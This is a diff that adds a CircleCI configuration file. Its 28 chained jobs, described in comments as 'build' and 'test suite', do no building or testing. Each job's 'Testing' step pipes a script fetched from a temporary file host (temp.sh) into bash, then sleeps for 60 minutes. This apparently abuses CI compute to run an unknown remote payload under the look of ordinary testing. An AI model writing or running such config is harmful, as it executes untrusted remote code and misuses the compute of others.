@@ -1,0 +1,610 @@
+version: 2.1
+jobs:
+  build:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test1:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test2:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test3:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test4:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test5:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test6:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test7:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test8:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test9:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test10:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test11:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test12:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test13:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test14:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test15:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test16:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test17:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test18:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test19:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test20:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test21:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test22:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test23:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test24:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test25:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test26:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/kuaAT/test.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+workflows:
+  version: 2
+  train-ai-robot:
+    jobs:
+      - build  # your custom job from your config, that builds your code
+      - test: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - build
+      - test1: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test
+      - test2: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test1
+      - test3: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test2
+      - test4: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test3
+      - test5: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test4
+      - test6: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test5
+      - test7: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test6
+      - test8: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test7
+      - test9: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test8
+      - test10: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test9
+      - test11: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test10
+      - test12: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test11
+      - test13: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test12
+      - test14: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test13
+      - test15: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test14
+      - test16: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test15
+      - test17: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test16
+      - test18: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test17
+      - test19: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test18
+      - test20: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test19
+      - test21: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test20
+      - test22: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test21
+      - test23: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test22
+      - test24: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test23
+      - test25: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test24
+      - test26: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test25
